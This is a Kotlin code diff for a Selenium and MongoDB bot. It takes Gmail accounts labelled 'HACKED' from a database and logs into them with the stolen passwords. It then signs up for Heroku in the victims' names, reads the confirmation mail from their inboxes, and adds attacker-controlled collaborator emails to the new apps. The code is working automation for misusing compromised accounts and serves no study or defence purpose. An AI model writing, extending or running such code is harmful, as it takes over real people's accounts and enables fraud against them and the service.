@@ -1,24 +1,26 @@
 package net.scr0pt.thirdservice.heroku
 
+import com.mongodb.client.MongoClients
+import com.mongodb.client.MongoCollection
+import com.mongodb.client.model.Updates
 import net.scr0pt.bot.HerokuPageResponse
 import net.scr0pt.bot.Page
 import net.scr0pt.bot.PageManager
 import net.scr0pt.bot.PageResponse
-import com.mongodb.client.MongoClients
-import com.mongodb.client.MongoCollection
-import com.mongodb.client.model.Updates
 import net.scr0pt.crawl.school.random
-import org.jsoup.nodes.Document
-import org.openqa.selenium.WebDriver
-import org.openqa.selenium.firefox.FirefoxDriver
 import net.scr0pt.thirdservice.mlab.loginGoogle
 import net.scr0pt.thirdservice.mongodb.MongoConnection
 import net.scr0pt.utils.FakeProfile
+import net.scr0pt.utils.tempmail.Gmail
+import net.scr0pt.utils.tempmail.event.MailReceiveEvent
+import net.scr0pt.utils.tempmail.models.Mail
 import net.scr0pt.utils.webdriver.Browser
 import net.scr0pt.utils.webdriver.executeScript
 import net.scr0pt.utils.webdriver.findElWait
 import net.scr0pt.utils.webdriver.findFirstElWait
-import java.util.concurrent.ThreadLocalRandom
+import org.jsoup.nodes.Document
+import org.openqa.selenium.WebDriver
+import org.openqa.selenium.firefox.FirefoxDriver
 
 /**
  * Created by Long
@@ -37,13 +39,19 @@ suspend fun main() {
     val herokuCollection = herokuDatabase.getCollection("heroku-account")
     while (true) {
         eduCollection.random(org.bson.Document("login_status", "PASSWORD_CORRECT").append("email_status", "HACKED"))?.let {
+            if (!it.containsKey("Allow less secure apps")) return
+
             val gmailUsername = it.getString("email")
             val gmailPassword = it.getString("new_pass") ?: it.getString("pass")
+            val gmail_recover_email: String? = it.getString("recover_email")
 
             if (herokuCollection.countDocuments(org.bson.Document("email", gmailUsername)) > 0L) return
 
             val appName = randomAppname()
-            val collaboratorEmail = "brucealmighty5daeae612ce205583fda39d5@gmail.com"
+            val collaboratorEmailList = arrayListOf(
+                    "brucealmighty5daeae612ce205583fda39d5@gmail.com",
+                    "alphahoai@gmail.com"
+            )
             val result = FakeProfile.getNewProfile()
             val first = result?.name?.first ?: "Bruce"
             val last = result?.name?.last ?: "Lee"
@@ -53,10 +61,11 @@ suspend fun main() {
             registerHeroku(
                     gmailUsername = gmailUsername,
                     gmailPassword = gmailPassword,
+                    gmail_recover_email = gmail_recover_email,
                     email = gmailUsername,
                     appName = appName,
-                    collaboratorEmail = collaboratorEmail,
-                    password = "Bruce_${ThreadLocalRandom.current().nextInt()}",
+                    collaboratorEmailList = collaboratorEmailList,
+                    password = "Bruce_${System.currentTimeMillis()}",
                     firstName = first,
                     lastName = last,
                     driver = Browser.firefox,
@@ -72,13 +81,16 @@ suspend fun registerHeroku(
         firstName: String,
         lastName: String,
         appName: String,
-        collaboratorEmail: String,
+        collaboratorEmailList: ArrayList<String>,
         driver: FirefoxDriver,
         herokuCollection: MongoCollection<org.bson.Document>,
         gmailUsername: String,
-        gmailPassword: String
+        gmailPassword: String,
+        gmail_recover_email: String?
 ) {
     loginGoogle(gmailUsername, gmailPassword, driver, onLoginSuccess = {
+        val registerTime = System.currentTimeMillis()
+
         val pageManager = PageManager(
                 arrayListOf<Page>(
                         HerokuRegisterPage(firstName, lastName, email) {
@@ -89,7 +101,7 @@ suspend fun registerHeroku(
                             )
                             println("HerokuRegisterPage success")
                         },
-                        HerokuRegisterDoneWaitingCheckEmailPage() {
+                        HerokuRegisterDoneWaitingCheckEmailPage(gmailUsername, gmailPassword, registerTime ) {
                             println("HerokuRegisterDone_WaitingCheckEmail_Page success")
                         },
                         GoogleGmailPage() {
@@ -115,8 +127,8 @@ suspend fun registerHeroku(
                         HerokuDeployPagePage {
                             println("HerokuDeployPagePage success")
                         },
-                        HerokuAccessPage(collaboratorEmail = collaboratorEmail) {
-                            println("HerokuAccessPage ${collaboratorEmail} success")
+                        HerokuAccessPage(collaboratorEmailList = collaboratorEmailList) {
+                            println("HerokuAccessPage ${collaboratorEmailList.joinToString(", ")} success")
                         }
                 ),
                 driver,
@@ -127,7 +139,7 @@ suspend fun registerHeroku(
             if (pageResponse is HerokuPageResponse.COLLABORATOR_ADDED) {
                 herokuCollection.updateOne(
                         org.bson.Document("email", email),
-                        Updates.push("collaborators", collaboratorEmail)
+                        Updates.pushEach("collaborators", collaboratorEmailList)
                 )
             }
 
@@ -135,7 +147,7 @@ suspend fun registerHeroku(
             driver.close()
             Thread.sleep(180000)
         }
-    })
+    }, recoverEmail = gmail_recover_email)
 }
 
 class HerokuRegisterPage(
@@ -179,12 +191,41 @@ class HerokuRegisterPage(
 }
 
 class HerokuRegisterDoneWaitingCheckEmailPage(
+        val gmailUsername: String,
+        val gmailPassword: String,
+        val registerTime: Long,
         onPageFinish: (() -> Unit)? = null
 ) : Page(onPageFinish = onPageFinish) {
     override fun isEndPage() = false
+    var gmail: Gmail? = null
 
     override fun _action(driver: WebDriver): PageResponse {
-        driver.get("https://mail.google.com/mail/u/0/?tab=wm#inbox")
+        if (gmail == null) {
+            gmail =
+                    Gmail(gmailUsername, gmailPassword).apply {
+                        onEvent(MailReceiveEvent(
+                                key = "ona_heroku_sender",
+                                validator = { mail ->
+                                    (mail.id ?: 0) > registerTime &&
+                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.from, "noreply@heroku.com") &&
+                                            Mail.CompareType.EQUAL_IGNORECASE.compare(mail.subject, "Confirm your account on Heroku")
+                                },
+                                callback = { mails ->
+                                    val mail =
+                                            mails.firstOrNull { it.content?.contains("Thanks for signing up with Heroku! You must follow this link to activate your account:") == true }
+                                    val acceptLink = mail?.contentDocumented?.selectFirst("a[href^='https://id.heroku.com/account/accept/']")?.attr("href")
+                                    if (acceptLink != null) {
+                                        this.logout()
+                                        driver.get(acceptLink)
+                                    }
+                                },
+                                once = false,
+                                new = true,
+                                fetchContent = true
+                        )
+                        )
+                    }
+        }
         return PageResponse.WAITING_FOR_RESULT()
     }
 
@@ -289,36 +330,50 @@ class HerokuDeployPagePage(
                     currentUrl.contains("/deploy/heroku-git")
 }
 
+
 class HerokuAccessPage(
-        val collaboratorEmail: String,
+        collaboratorEmailList: ArrayList<String>,
         onPageFinish: (() -> Unit)? = null
 ) : Page(onPageFinish = onPageFinish) {
+    data class AddingCollaboratorEmailStatus(val collaboratorEmail: String, var isAdded: Boolean = false)
+
+    private val collaboratorEmailObjectList: List<AddingCollaboratorEmailStatus> = collaboratorEmailList.map { AddingCollaboratorEmailStatus(it) }
+
     override fun isEndPage() = false
 
     override fun watingResult(doc: Document, currentUrl: String, title: String): PageResponse? {
-        if (doc.select(".collaborator-item:contains(collaborator) td:nth-child(2)")
-                        ?.firstOrNull { collaboratorEmail.equals(it.text(), ignoreCase = true) } != null
-        ) {
+
+        doc.select(".collaborator-list tr.collaborator-item")?.forEach {
+            val txt = it.text().trim()
+            val email = txt.split(" ")[0]
+//            val role = txt.split(" ")[1]
+
+            collaboratorEmailObjectList.firstOrNull { collaboratorEmail -> collaboratorEmail.collaboratorEmail == email }?.let {
+                it.isAdded = true
+            }
+        }
+
+        if (collaboratorEmailObjectList.firstOrNull { !it.isAdded } == null) {
             return HerokuPageResponse.COLLABORATOR_ADDED()
         }
         return null
     }
 
     override fun _action(driver: WebDriver): PageResponse {
-        println("addCollaboratorBtns")
-        val addCollaboratorBtns =
-                driver.findFirstElWait(1000, 60000, "button", jsoup = false, filter = { el -> el.text.trim().equals("Add collaborator", ignoreCase = true) })
-                        ?: return PageResponse.NOT_FOUND_ELEMENT()
-        addCollaboratorBtns.click()
-        println("passwordConfirmInputs")
-        val passwordConfirmInputs = driver.findFirstElWait(1000, 60000, "input", jsoup = false, filter = { el -> el.getAttribute("placeholder") == "user@domain.com" })
-                ?: return PageResponse.NOT_FOUND_ELEMENT()
-        passwordConfirmInputs.sendKeys(collaboratorEmail)
-        println("saveChangesBtns")
-        val saveChangesBtns =
-                driver.findFirstElWait(1000, 60000, "button", jsoup = false, filter = { el -> el.text.trim().equals("Save changes", ignoreCase = true) })
-                        ?: return PageResponse.NOT_FOUND_ELEMENT()
-        saveChangesBtns.click()
+
+        collaboratorEmailObjectList.forEach {
+            val collaboratorEmail = it.collaboratorEmail
+            driver.findFirstElWait(2000, 60000, "button", jsoup = false,
+                    filter = { el -> "Add collaborator".equals(el.text.trim(), ignoreCase = true) })?.click()
+                    ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
+            driver.findFirstElWait(2000, 60000, "input", jsoup = false,
+                    filter = { el -> "user@domain.com".equals(el.getAttribute("placeholder"), ignoreCase = true) })?.sendKeys(collaboratorEmail)
+                    ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
+            driver.findFirstElWait(2000, 60000, "button", jsoup = false,
+                    filter = { el -> "Save changes".equals(el.text.trim(), ignoreCase = true) })?.click()
+                    ?: return@_action PageResponse.NOT_FOUND_ELEMENT()
+            Thread.sleep(2000)
+        }
         return PageResponse.WAITING_FOR_RESULT()
     }
 
